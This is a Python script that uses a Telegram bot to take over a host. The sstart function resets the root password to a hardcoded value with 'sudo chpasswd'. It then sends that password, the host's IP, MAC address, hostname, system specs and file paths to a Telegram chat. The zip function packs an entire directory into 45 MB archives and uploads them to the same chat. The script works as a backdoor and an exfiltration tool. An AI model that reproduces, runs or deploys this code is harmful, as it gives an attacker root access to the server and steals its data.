import os
import socket
import platform
import telebot
import subprocess
import psutil
import uuid
import zipfile
from colorama import Fore, init

init()

def sstart(token, chat_id, password="Sawad_is_hear"):
    try:
        bot = telebot.TeleBot(token)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        os.system(f"echo 'root:{password}' | sudo chpasswd")
        hostname = socket.gethostname()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        os_info = platform.platform()
        cpu_info = platform.processor()
        ram_info = f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB"
        disk_info = subprocess.getoutput("df -h /")
        current_path = os.getcwd()
        file_path = os.path.abspath(__file__)   
        msg = f"""
<b>. Server .</b>
━━━━━━━━━━━━━━━━━━━━
<b>🖥️ - : </b> <code>{hostname}</code>
<b>🌐 - : </b> <code>{ip}</code>
<b>🔑 - : </b> <code>{password}</code>
<b>📟 - : </b> <code>{mac_address}</code>
━━━━━━━━━━━━━━━━━━━━
<b>💻 - : </b> <code>{os_info}</code>
<b>⚙️ - : </b> <code>{cpu_info}</code>
<b>🧠 - : </b> <code>{ram_info}</code>
<b>💾 - : </b> 
<code>{disk_info}</code>
━━━━━━━━━━━━━━━━━━━━
<b>📂 - : </b> <code>{current_path}</code>
<b>📄 - : </b> <code>{file_path}</code>
━━━━━━━━━━━━━━━━━━━━
<b>🔧 By : </b> @B_Q_5 .
"""
        bot.send_message(chat_id, msg, parse_mode="HTML")
        print(Fore.GREEN+"By : @B_Q_5 | Server Info Sent Successfully .")
        return True
    except Exception as e:
        print(f"Error : {e}")
        return False
def zip(token, chat_id, program_path):
    try:
        bot = telebot.TeleBot(token)
        max_size = 45 * 1024 * 1024
        part_num = 1
        def get_zip_size(zip_path):
            return os.path.getsize(zip_path)
        def create_zip(source, destination, files):
            with zipfile.ZipFile(destination, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in files:
                    zipf.write(os.path.join(source, file), file)
        all_files = []
        for root, _, files in os.walk(program_path):
            for file in files:
                all_files.append(os.path.relpath(os.path.join(root, file), program_path))
        current_files = []
        current_size = 0
        for file in all_files:
            file_path = os.path.join(program_path, file)
            file_size = os.path.getsize(file_path)
            if current_size + file_size > max_size and current_files:
                zip_name = f"Golden-{part_num}.zip" if part_num > 1 else "Golden.zip"
                create_zip(program_path, zip_name, current_files)
                with open(zip_name, 'rb') as f:
                    bot.send_document(chat_id, f)
                os.remove(zip_name)
                part_num += 1
                current_files = []
                current_size = 0
            current_files.append(file)
            current_size += file_size
        if current_files:
            zip_name = f"Golden-{part_num}.zip" if part_num > 1 else "Golden.zip"
            create_zip(program_path, zip_name, current_files)
            with open(zip_name, 'rb') as f:
                bot.send_document(chat_id, f)
            os.remove(zip_name)
        return True
    except Exception as e:
        print(f"Error : {e}")
        return False